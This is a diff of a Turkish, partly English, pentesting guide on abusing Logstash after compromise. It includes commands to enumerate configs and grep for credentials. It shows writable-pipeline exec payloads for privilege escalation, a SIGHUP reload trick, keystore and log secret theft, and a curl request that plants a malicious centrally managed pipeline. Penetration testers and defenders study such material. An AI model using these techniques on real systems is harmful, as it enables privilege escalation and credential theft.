@@ -4,11 +4,11 @@
 
 ## Logstash
 
-Logstash, **logları toplamak, dönüştürmek ve göndermek** için **pipelines** olarak bilinen bir sistem aracılığıyla kullanılır. Bu **pipelines**, **input**, **filter** ve **output** aşamalarından oluşur. Logstash'in ele geçirilmiş bir makinede çalışması durumunda ilginç bir durum ortaya çıkar.
+Logstash, **gather, transform, and dispatch logs** amacıyla **pipelines** adı verilen bir sistem aracılığıyla kullanılır. Bu pipelines, **input**, **filter** ve **output** aşamalarından oluşur. Logstash'ın ele geçirilmiş bir makinede çalışması durumunda ilginç bir durum ortaya çıkar.
 
-### Pipeline Yapılandırması
+### Pipeline Configuration
 
-Pipelines, pipeline yapılandırmalarının konumlarını listeleyen **/etc/logstash/pipelines.yml** dosyasında yapılandırılır:
+Pipelines, pipeline yapılandırma dosyalarının konumlarını listeleyen **/etc/logstash/pipelines.yml** dosyasında yapılandırılır:
 ```yaml
 # Define your pipelines here. Multiple pipelines can be defined.
 # For details on multiple pipelines, refer to the documentation:
@@ -20,16 +20,16 @@ path.config: "/etc/logstash/conf.d/*.conf"
 path.config: "/usr/share/logstash/pipeline/1*.conf"
 pipeline.workers: 6
 ```
-Bu dosya, pipeline yapılandırmalarını içeren **.conf** dosyalarının nerede bulunduğunu gösterir. Bir **Elasticsearch output module** kullanıldığında, **pipelines**'larda genellikle **Elasticsearch credentials** bulunur; bunlar, Logstash'ın Elasticsearch'e veri yazma gereksinimi nedeniyle genellikle geniş ayrıcalıklara sahiptir. Yapılandırma yollarındaki Wildcards, Logstash'ın belirtilen dizindeki eşleşen tüm pipelines'ları çalıştırmasına olanak tanır.
+Bu dosya, pipeline yapılandırmalarını içeren **.conf** dosyalarının nerede bulunduğunu ortaya koyar. Bir **Elasticsearch output module** kullanıldığında, **pipelines** genellikle **Elasticsearch credentials** içerir; bunlar sıklıkla Logstash'ın Elasticsearch'e veri yazma gereksinimi nedeniyle geniş yetkilere sahiptir. Yapılandırma yollarındaki wildcards, Logstash'ın belirtilen dizindeki eşleşen tüm pipelines'ları çalıştırmasına izin verir.
 
-If Logstash is started with `-f <directory>` instead of `pipelines.yml`, **all files inside that directory are concatenated in lexicographical order and parsed as a single config**. This creates 2 offensive implications:
+Eğer Logstash `-f <directory>` ile `pipelines.yml` yerine başlatılırsa, **o dizindeki tüm dosyalar leksikografik sırayla birleştirilir ve tek bir config olarak parse edilir**. Bunun iki saldırı odaklı sonucu vardır:
 
-- A dropped file like `000-input.conf` or `zzz-output.conf` can change how the final pipeline is assembled
-- A malformed file can prevent the whole pipeline from loading, so validate payloads carefully before relying on auto-reload
+- `000-input.conf` veya `zzz-output.conf` gibi bırakılan bir dosya, final pipeline'ın nasıl oluşturulduğunu değiştirebilir
+- Bozuk (malformed) bir dosya tüm pipeline'ın yüklenmesini engelleyebilir; bu yüzden auto-reload'a güvenmeden önce payload'ları dikkatle doğrulayın
 
-### Ele Geçirilmiş Bir Host Üzerinde Hızlı Keşif
+### Fast Enumeration on a Compromised Host
 
-Logstash'ın yüklü olduğu bir makinede hızlıca şunları kontrol edin:
+Logstash'ın yüklü olduğu bir makinede, hızlıca şunları inceleyin:
 ```bash
 ps aux | grep -i logstash
 systemctl cat logstash 2>/dev/null
@@ -38,29 +38,29 @@ cat /etc/logstash/logstash.yml 2>/dev/null
 find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
 rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
 ```
-Ayrıca yerel monitoring API'sine erişilip erişilemediğini kontrol edin. Varsayılan olarak **127.0.0.1:9600** adresine bind olur; host üzerinde erişim sağlandıktan sonra bu genellikle yeterlidir:
+Ayrıca yerel izleme API'sinin erişilebilir olup olmadığını kontrol edin. Varsayılan olarak **127.0.0.1:9600** üzerinde bağlanır, bu genellikle host'a eriştikten sonra yeterlidir:
 ```bash
 curl -s http://127.0.0.1:9600/?pretty
 curl -s http://127.0.0.1:9600/_node/pipelines?pretty
 curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
 ```
-Bu genellikle size pipeline ID'leri, çalışma zamanı detayları ve değiştirdiğiniz pipeline'ın yüklendiğine dair onayı verir.
+Bu genellikle size pipeline ID'leri, runtime detayları ve değiştirdiğiniz pipeline'ın yüklendiğine dair onay sağlar.
 
-Credentials recovered from Logstash commonly unlock **Elasticsearch**, so check [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).
+Logstash'tan elde edilen kimlik bilgileri genellikle **Elasticsearch**'e erişim sağlar, bu yüzden [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).
 
-### Writable Pipelines ile Privilege Escalation
+### Privilege Escalation via Writable Pipelines
 
-Privilege Escalation girişimi yapmak için, önce Logstash servisinin hangi kullanıcı hesabı altında çalıştığını belirleyin; genellikle **logstash** kullanıcısıdır. Aşağıdaki kriterlerden **birini** karşıladığınızdan emin olun:
+To attempt privilege escalation, önce Logstash servisinin hangi kullanıcı altında çalıştığını belirleyin; genellikle **logstash** kullanıcısıdır. Aşağıdaki kriterlerden **bir**ini karşıladığınızdan emin olun:
 
-- Bir pipeline **.conf** dosyasına **yazma erişimine** sahip olmak **veya**
-- **/etc/logstash/pipelines.yml** dosyası bir wildcard kullanıyor ve hedef klasöre yazabiliyor olmak
+- Bir pipeline **.conf** dosyasına **write access** sahibi olmak **veya**
+- **/etc/logstash/pipelines.yml** dosyası wildcard kullanıyor ve hedef klasöre yazabiliyorsanız
 
-Ek olarak, aşağıdaki koşullardan **biri** yerine getirilmelidir:
+Ek olarak, aşağıdaki koşullardan **bir**i sağlanmış olmalıdır:
 
-- Logstash servisini yeniden başlatabilme yeteneğine sahip olmak **veya**
-- **/etc/logstash/logstash.yml** dosyasında **config.reload.automatic: true** ayarlı olmak
+- Logstash servisini yeniden başlatabilme yeteneği **veya**
+- **/etc/logstash/logstash.yml** dosyasında **config.reload.automatic: true** ayarının bulunması
 
-Yapılandırmada bir wildcard varsa, bu wildcard ile eşleşen bir dosya oluşturmak komut yürütmeye izin verir. Örneğin:
+Konfigürasyonda bir wildcard varsa, bu wildcard ile eşleşen bir dosya oluşturmak komut çalıştırmaya izin verir. Örneğin:
 ```bash
 input {
 exec {
@@ -76,15 +76,15 @@ codec => rubydebug
 }
 }
 ```
-Burada, **interval** saniye cinsinden çalıştırma sıklığını belirler. Verilen örnekte, **whoami** komutu her 120 saniyede bir çalışır ve çıktısı **/tmp/output.log**'a yönlendirilir.
+Burada, **interval** çalıştırma sıklığını saniye cinsinden belirler. Verilen örnekte, **whoami** komutu her 120 saniyede bir çalışır ve çıktısı **/tmp/output.log** dosyasına yönlendirilir.
 
-**config.reload.automatic: true** ile **/etc/logstash/logstash.yml** içinde, Logstash yeniden başlatmaya gerek kalmadan yeni veya değiştirilmiş pipeline yapılandırmalarını otomatik olarak algılar ve uygular. Eğer bir wildcard yoksa, mevcut yapılandırmalarda yine de değişiklik yapılabilir; ancak kesintileri önlemek için dikkatli olunmalıdır.
+**/etc/logstash/logstash.yml** içinde **config.reload.automatic: true** ayarlıysa, Logstash yeni veya değiştirilmiş pipeline yapılandırmalarını yeniden başlatmaya gerek kalmadan otomatik olarak algılar ve uygular. Eğer wildcard yoksa, mevcut yapılandırmalarda yine değişiklik yapılabilir; ancak kesintilerden kaçınmak için dikkatli olunmalıdır.
 
-### Daha Güvenilir Pipeline Payload'ları
+### More Reliable Pipeline Payloads
 
-`exec` input plugin mevcut sürümlerde hâlâ çalışır ve ya bir `interval` ya da bir `schedule` gerektirir. Bu, Logstash JVM'i **forking** yaparak çalıştırır; bu yüzden bellek kısıtlıysa payload'ınız sessizce çalışmak yerine `ENOMEM` ile başarısız olabilir.
+`exec` input plugin'i mevcut sürümlerde hala çalışır ve ya bir `interval` ya da bir `schedule` gerektirir. Logstash JVM'sini **forking** yaparak çalıştırır; bu yüzden bellek kısıtlıysa payload'ınız sessizce çalışmak yerine `ENOMEM` ile başarısız olabilir.
 
-Daha pratik bir privilege-escalation payload genellikle kalıcı bir artefakt bırakanıdır:
+Daha pratik bir privilege-escalation payload genellikle kalıcı bir artefakt bırakan türdendir:
 ```bash
 input {
 exec {
@@ -96,20 +96,20 @@ output {
 null {}
 }
 ```
-Yeniden başlatma yetkiniz yok ancak sürece sinyal gönderebiliyorsanız, Logstash Unix-benzeri sistemlerde **SIGHUP** ile tetiklenen yeniden yüklemeyi de destekler:
+Eğer yeniden başlatma yetkiniz yoksa ancak sürece sinyal gönderebiliyorsanız, Logstash Unix-benzeri sistemlerde **SIGHUP** ile tetiklenen bir yeniden yüklemeyi de destekler:
 ```bash
 kill -SIGHUP $(pgrep -f logstash)
 ```
-Her eklentinin yeniden yüklemeye uygun olmadığını unutmayın. Örneğin, **stdin** input otomatik yeniden yüklemeyi engeller; bu yüzden `config.reload.automatic`'ın değişikliklerinizi her zaman algılayacağını varsaymayın.
+Be aware that not every plugin is reload-friendly. For example, the **stdin** input prevents automatic reload, so don't assume `config.reload.automatic` will always pick up your changes.
 
-### Logstash'tan Gizli Bilgileri Çalma
+### Stealing Secrets from Logstash
 
 Sadece kod yürütmeye odaklanmadan önce, Logstash'in zaten erişimi olan verileri toplayın:
 
-- Düz metin kimlik bilgileri genellikle `elasticsearch {}` çıktılarında, `http_poller`, JDBC input'larında veya bulut ile ilgili ayarlarda sabit kodlanmıştır
-- Güvenli ayarlar **`/etc/logstash/logstash.keystore`** içinde veya başka bir `path.settings` dizininde bulunuyor olabilir
-- Keystore parolası genellikle **`LOGSTASH_KEYSTORE_PASS`** aracılığıyla sağlanır ve paket tabanlı kurulumlar genellikle bunu **`/etc/sysconfig/logstash`**'tan alır
-- `${VAR}` ile yapılan ortam değişkeni genişletmesi Logstash başlatılırken çözülür; bu yüzden servis ortamını incelemek faydalıdır
+- Düz metin kimlik bilgileri genellikle `elasticsearch {}` çıktıları, `http_poller`, JDBC girdileri veya bulutla ilgili ayarlar içinde sabit kodlanır
+- Güvenli ayarlar **`/etc/logstash/logstash.keystore`** içinde veya başka bir `path.settings` dizininde bulunabilir
+- Keystore parolası sıklıkla **`LOGSTASH_KEYSTORE_PASS`** aracılığıyla sağlanır ve paket tabanlı kurulumlar genellikle bunu **`/etc/sysconfig/logstash`**'tan alır
+- `${VAR}` ile çevresel değişken genişletmesi Logstash başlangıcında çözülür, bu yüzden servisin ortamını incelemeye değer
 
 Yararlı kontroller:
 ```bash
@@ -120,19 +120,19 @@ cat /etc/sysconfig/logstash 2>/dev/null
 journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
 ls -lah /var/log/logstash 2>/dev/null
 ```
-Bu ayrıca kontrol edilmeye değer çünkü **CVE-2023-46672**, Logstash'ın belirli koşullar altında günlüklerde hassas bilgileri kaydedebileceğini gösterdi. Bir post-exploitation host'ta, eski Logstash logları ve `journald` girdileri, güncel konfigürasyon keystore'u referans gösterse ve sırları satır içi saklamasa bile kimlik bilgilerini ifşa edebilir.
+Bunu kontrol etmek de önemlidir çünkü **CVE-2023-46672**, belirli durumlarda Logstash'ın hassas bilgileri loglarda kaydedebileceğini gösterdi. Bir post-exploitation hostunda, eski Logstash logları ve `journald` girdileri, mevcut config gizli bilgileri inline olarak saklamak yerine keystore'u referans gösterse bile kimlik bilgilerini açığa çıkarabilir.
 
 ### Merkezi Pipeline Yönetimi İstismarı
 
-Bazı ortamlarda host yerel `.conf` dosyalarına hiç güvenmez. Eğer **`xpack.management.enabled: true`** yapılandırılmışsa, Logstash Elasticsearch/Kibana'dan merkezi olarak yönetilen pipeline'ları çekebilir ve bu modu etkinleştirdikten sonra yerel pipeline konfigürasyonları artık birincil kaynak olmaz.
+Bazı ortamlarda host yerel `.conf` dosyalarına hiç güvenmez. Eğer **`xpack.management.enabled: true`** yapılandırılmışsa, Logstash Elasticsearch/Kibana'dan merkezi olarak yönetilen pipeline'ları çekebilir ve bu modu etkinleştirdikten sonra yerel pipeline konfigürasyonları artık gerçek kaynak olmaz.
 
-Bu, farklı bir saldırı yolu anlamına gelir:
+Bu farklı bir saldırı yolu demektir:
 
-1. Yerel Logstash ayarlarından, keystore'dan veya loglardan Elastic kimlik bilgilerini kurtarın
-2. Hesabın **`manage_logstash_pipelines`** cluster ayrıcalığına sahip olup olmadığını doğrulayın
-3. Merkezi olarak yönetilen bir pipeline oluşturun veya değiştirin; böylece Logstash host'u bir sonraki sorgulama aralığında payload'unuzu çalıştırır
+1. Elastic kimlik bilgilerini yerel Logstash ayarlarından, keystore'dan veya loglardan kurtarın
+2. Hesabın **`manage_logstash_pipelines`** cluster yetkisine sahip olup olmadığını doğrulayın
+3. Merkezi olarak yönetilen bir pipeline oluşturun veya değiştirin, böylece Logstash hostu bir sonraki poll aralığında payload'unuzu çalıştırır
 
-The Elasticsearch API used for this feature is:
+Bu özellik için kullanılan Elasticsearch API'si şudur:
 ```bash
 curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
 -H 'Content-Type: application/json' \
@@ -144,9 +144,9 @@ curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
 "pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
 }'
 ```
-Bu, yerel dosyalar salt okunur durumda olduğunda ancak Logstash zaten uzaktan pipeline'ları çekmek üzere kayıtlıysa özellikle kullanışlıdır.
+Bu, yerel dosyalar salt okunur olduğunda ancak Logstash zaten pipeline'ları uzaktan almak üzere kayıtlıysa özellikle faydalıdır.
 
-## Kaynaklar
+## Referanslar
 
 - [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
 - [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
